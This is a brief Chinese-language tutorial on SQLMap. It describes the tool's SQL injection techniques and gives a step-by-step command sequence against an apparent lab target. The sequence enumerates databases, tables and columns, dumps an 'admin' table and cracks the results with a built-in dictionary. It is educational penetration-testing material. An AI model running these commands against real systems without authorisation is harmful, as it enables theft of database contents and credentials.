# SQLMap应用
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x01 简介
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SQLmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL，Oracle，PostgreSQL，Microsoft  SQL  Server，Microsoft Acess，IBM DB2，SQLLite，Firebird，Sybase和SAP MaxDB……SQLmap采用几种独特的SQL注入技术，分别是盲推理SQL注入，UNION查询SQL注入，对查询和盲注。其广泛的功能和选项包括数据库指纹，枚举，数据库提取，访问目标文件系统，并在获取完全操作权限时实行任意命令
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x02 详解 
![](/assets/WX20190306-160348@2x.png)
![](/assets/WX20190306-161610@2x.png)
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x03 流程 (目标注入地址尽量用双引号引起来)
![](/assets/AF1C4C8C3124CC854FBE3962B95BFA39.png)


```python
    URL = "http://172.16.12.2/inject.php?id=1"
    sqlmap.py -u "URL" --dbs         --dbs: 列举数据库
    sqlmap.py -u "URL" --current-db  --current-db: 当前数据库
    sqlmap.py -u "URL" -D dbname  --tables  dbname:指定数据库名称 --tables:列出某数据库上的所有表
    sqlmap.py -u "URL" -D dbname -T tablename --columns -D  --columns:列出指定表上的所有列
    sqlmap.py -u "URL" -D sqlinject  -T admin -C 字段 --dump --dump:导出列里面的字段
    然后回车默认通过字典来破解，选择1利用自带的字典暴力破解
```






 







